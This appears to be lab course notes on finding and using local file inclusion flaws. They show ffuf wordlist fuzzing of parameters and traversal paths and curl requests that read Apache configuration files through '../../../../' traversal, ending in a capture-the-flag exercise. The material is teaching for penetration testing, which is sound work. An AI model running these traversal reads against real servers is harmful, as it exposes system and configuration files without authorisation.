# Automated Scanning

## Fuzzing Parameters

The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module goes into details on how we can fuzz for `GET`/`POST` parameters. For example, we can fuzz the page for common `GET` parameters, as follows:

```shell-session
eldeim@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

> Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

## LFI wordlists

There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:

```shell-session
eldeim@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx

```

## Fuzzing Server Files

### **Server Webroot**

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwords.

The following is an example of how we can do all of this with ffuf:

```shell-session
eldeim@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

As we can see, the scan did indeed identify the correct webroot path at (`/var/www/html/`). We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier, as it also contains various payloads that may reveal the webroo

### **Server Logs/Configurations**

To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

```shell-session
eldeim@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287

/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

As we can see, the scan returned over 60 results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read (`/etc/apache2/apache2.conf`), as it is a known path for the apache server configuration:

```shell-session
eldeim@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values:

```shell-session
eldeim@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`, which have accessed in the previous section.

## LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

### PoCs - Questions

* Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
